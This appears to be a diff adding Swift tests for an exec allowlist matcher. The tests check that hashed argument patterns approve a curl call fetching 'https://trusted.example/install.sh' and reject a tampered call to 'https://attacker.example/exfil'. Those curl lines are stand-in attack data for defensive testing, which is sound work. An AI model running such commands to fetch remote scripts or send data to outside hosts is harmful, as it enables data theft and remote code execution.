@@ -1,3 +1,4 @@
+import CryptoKit
 import Foundation
 import Testing
 @testable import OpenClaw
@@ -37,6 +38,14 @@ struct ExecAllowlistTests {
         let data = try Data(contentsOf: fixtureURL)
         let fixture = try JSONDecoder().decode(WrapperResolutionParityFixture.self, from: data)
         return fixture.cases
+    }
+
+    private static func hashedArgPattern(_ argv: [String]) -> String {
+        let nul = "\0"
+        let arguments = Array(argv.dropFirst())
+        let subject = arguments.isEmpty ? nul + nul : arguments.joined(separator: nul) + nul
+        let digest = SHA256.hash(data: Data(subject.utf8))
+        return "sha256:argv:" + digest.map { String(format: "%02x", $0) }.joined()
     }
 
     private static func fixtureURL(filename: String) -> URL {
@@ -196,6 +205,32 @@ struct ExecAllowlistTests {
         #expect(ExecAllowlistMatcher.match(entries: [zeroArgs], resolution: base) != nil)
         #expect(ExecAllowlistMatcher.match(entries: [oneArg], resolution: withSpace) != nil)
         #expect(ExecAllowlistMatcher.match(entries: [zeroArgs], resolution: withSpace) == nil)
+    }
+
+    @Test func `match enforces generated hashed arg patterns before regex fallback`() {
+        let executable = "/usr/bin/curl"
+        let approvedArgv = [executable, "https://trusted.example/install.sh"]
+        let entry = ExecAllowlistEntry(
+            pattern: executable,
+            argPattern: Self.hashedArgPattern(approvedArgv))
+        let approved = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "curl",
+            cwd: nil,
+            argv: approvedArgv)
+        let changed = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "curl",
+            cwd: nil,
+            argv: [executable, entry.argPattern ?? "", "https://attacker.example/exfil"])
+
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: approved) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: changed) == nil)
+        #expect(entry.argPattern?.contains("trusted.example") == false)
     }
 
     @Test func `arg pattern does not discard redirect shaped direct argv literal`() {
